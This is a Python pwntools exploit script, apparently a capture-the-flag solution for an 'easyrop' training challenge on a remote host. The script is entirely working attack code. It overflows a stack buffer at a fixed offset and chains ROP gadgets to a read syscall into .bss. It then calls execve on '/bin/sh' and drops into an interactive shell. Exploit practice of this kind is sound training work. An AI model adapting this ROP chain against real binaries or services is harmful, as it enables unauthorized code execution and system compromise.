import pwn

pwn.context.terminal = ['gnome-terminal', '-e']
pwn.context.arch = 'amd64'

r = pwn.remote('training.jinblack.it', 2015)


# r = pwn.process('./easyrop')

# main_ret_addr = 0x00400291

# pwn.gdb.attach(r, """
#     b *0x00400291
#     c
# """)


input('wait')

INT_SIZE = 4
buffer_size = 12
numbers_per_position = 2


cyclic = pwn.cyclic(INT_SIZE * buffer_size * numbers_per_position * 8, n=4)

def space_payload_as_ints(payload):
    zero = pwn.p32(0x0)
    result = b''

    def chunks(lst, n):
        """Yield successive n-sized chunks from lst."""
        for i in range(0, len(lst), n):
            yield lst[i:i + n]

    for x in chunks(payload, 4):
        result += x
        result += zero

    return result


mapping_payload = space_payload_as_ints(cyclic)

print(mapping_payload)

offset_to_sIP = 112

pop_rdi__pop_rsi__pop_rdx__pop_rax = 0x4001c2
syscall = 0x400168
pop_rdx_pop_rax = 0x4001c4
zero_rax = 0x400161
pop_rbp = 0x40016f

ADDRESS_SIZE = 8
spacer = b'B' * ADDRESS_SIZE

len_addr_in_bss = 0x600370

read_rdi_arg = 0x0
read_rsi_arg = len_addr_in_bss
read_rdx_arg = 0x100
read_rax_arg = 0x0

read_payload = pwn.p64(pop_rdi__pop_rsi__pop_rdx__pop_rax) + pwn.p64(read_rdi_arg) + pwn.p64(read_rsi_arg) + pwn.p64(read_rdx_arg) + pwn.p64(read_rax_arg)+ pwn.p64(syscall)

rbp_replacement = len_addr_in_bss + 32

rbp_clean_payload = pwn.p64(0x40016f) + pwn.p64(rbp_replacement)

execve_rdi_arg = len_addr_in_bss
execve_rsi_arg = len_addr_in_bss + 7
execve_rdx_arg = len_addr_in_bss + 7
execve_rax_arg = 0x3b

execve_payload = spacer + pwn.p64(pop_rdi__pop_rsi__pop_rdx__pop_rax) + pwn.p64(execve_rdi_arg) + pwn.p64(execve_rsi_arg) + pwn.p64(execve_rdx_arg) + pwn.p64(execve_rax_arg)+ pwn.p64(syscall)

spaced_payload = space_payload_as_ints(rbp_clean_payload + read_payload + execve_payload)

r.send(b'A' * offset_to_sIP + spaced_payload)
pwn.sleep(0.1)
r.send(b'\n')
pwn.sleep(0.1)
r.send(b'\n')
pwn.sleep(0.1)
r.send(b'/bin/sh' + b'\x00' * 8)

r.interactive()